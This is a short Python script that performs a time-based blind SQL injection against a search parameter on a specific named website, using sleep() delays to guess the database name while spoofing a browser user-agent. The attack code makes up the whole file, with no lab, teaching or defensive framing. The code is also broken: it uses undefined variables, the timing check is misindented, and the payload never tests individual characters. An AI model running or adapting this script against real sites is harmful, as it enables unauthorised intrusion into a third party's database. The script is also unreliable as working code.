#!/usr/bin/python
import requests
import time
import string
import sys

headers = {"user-agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"}

url = "http://www.zzyouth.org/search.aspx?kwd=1"
guess = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
result = ''

print("start")
for i in range(1,20):
    for j in guess:
        charAscii = ord(j)
        Url = url+' and if(length(database())>{0},1,sleep(3))--+'
        urlFormat = Url.format(i,charAscii)
        start_time = time.time()
        res = requests.get(urlFormat,headers=headers)

    if  time.time() - start_time > 2.5:
            database+=char
            print ('database: ',database)
            break
    else:
        pass

print('database is '+result)
